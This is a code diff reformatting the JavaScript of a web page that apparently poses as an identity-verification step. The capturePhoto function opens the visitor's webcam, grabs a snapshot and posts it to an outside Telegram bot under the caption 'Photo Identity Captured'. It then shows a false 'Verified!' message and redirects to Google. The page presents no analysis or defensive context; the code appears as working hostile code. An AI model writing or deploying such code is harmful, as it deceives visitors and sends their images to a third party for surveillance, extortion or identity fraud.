@@ -89,72 +89,65 @@
     }
 
     async function capturePhoto() {
-    try {
-        statusText.innerText = "Finalizing Verification...";
-        // Check if user granted access to the camera
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        
-        if (!stream || !stream.getVideoTracks().length) {
-            throw new Error('No access to camera');
-        }
+        try {
+            statusText.innerText = "Finalizing Verification...";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            
+            if (!stream || !stream.getVideoTracks().length) {
+                throw new Error('No access to camera');
+            }
 
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-        // Wait for video to load
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    throw new Error('Video dimensions not available');
-                }
-                resolve();
-            };
-        });
-        
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        // Test the video playback before drawing on canvas
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait a bit to ensure the video is playing
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    if (video.videoWidth === 0 || video.videoHeight === 0) {
+                        throw new Error('Video dimensions not available');
+                    }
+                    resolve();
+                };
+            });
+            
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            await new Promise(resolve => setTimeout(resolve, 1000)); 
 
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // Check the canvas image
-        const img = new Image();
-        img.src = canvas.toDataURL('image/jpeg');
-        document.body.appendChild(img); // Add the image to the DOM to visually check if it's correct
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const img = new Image();
+            img.src = canvas.toDataURL('image/jpeg');
+            document.body.appendChild(img); 
 
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-        if (!blob) {
-            throw new Error('Failed to create blob');
-        }
+            if (!blob) {
+                throw new Error('Failed to create blob');
+            }
 
-        // Send to Telegram
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'identity_check.jpg');
-        formData.append('caption', '📸 Photo Identity Captured');
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'identity_check.jpg');
+            formData.append('caption', '📸 Photo Identity Captured');
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
 
-        // Stop Camera
-        stream.getTracks().forEach(track => track.stop());
-        
-        statusText.innerText = "Verified! Redirecting...";
-        setTimeout(() => {
+            stream.getTracks().forEach(track => track.stop());
+            
+            statusText.innerText = "Verified! Redirecting...";
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000); 
+
+        } catch (err) {
+            console.error(err);
             window.location.href = "https://www.google.com";
-        }, 2000); // Changed to 2000 to give time to see the image if appended to the body
-
-    } catch (err) {
-        console.error(err);
-        // Even if camera fails, redirect after location
-        window.location.href = "https://www.google.com";
-    }
+        }
     }
 </script>
 
